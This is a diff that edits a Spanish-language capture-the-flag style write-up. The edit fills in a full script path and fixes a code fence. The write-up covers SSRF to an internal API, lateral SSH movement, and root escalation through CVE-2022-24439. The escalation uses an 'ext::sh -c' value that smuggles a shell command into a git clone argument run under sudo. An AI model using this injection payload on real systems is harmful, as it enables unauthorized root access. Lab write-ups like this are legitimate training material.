@@ -39,11 +39,12 @@ Las credenciales de `dev` funcionan por SSH. En `~/apps` hay un `.git` sin los a
 # SSRF a la API interna
 url=http://localhost:5000/api/latest/metadata/messages/authors
 # CVE-2022-24439
-sudo /usr/bin/python3 /opt/.../clone_prod_change.py 'ext::sh -c /dev/shm/root.sh'```
+sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c /dev/shm/root.sh'
+```
 
 ## Movimiento lateral
 
-La contraseña de `prod` funciona por SSH. `prod` puede ejecutar como root `/opt/.../clone_prod_change.py`, que hace `Repo.clone_from(sys.argv[1], ...)`.
+La contraseña de `prod` funciona por SSH. `prod` puede ejecutar como root `/opt/internal_apps/clone_changes/clone_prod_change.py`, que hace `Repo.clone_from(sys.argv[1], ...)`.
 
 ## Escalada de privilegios
 
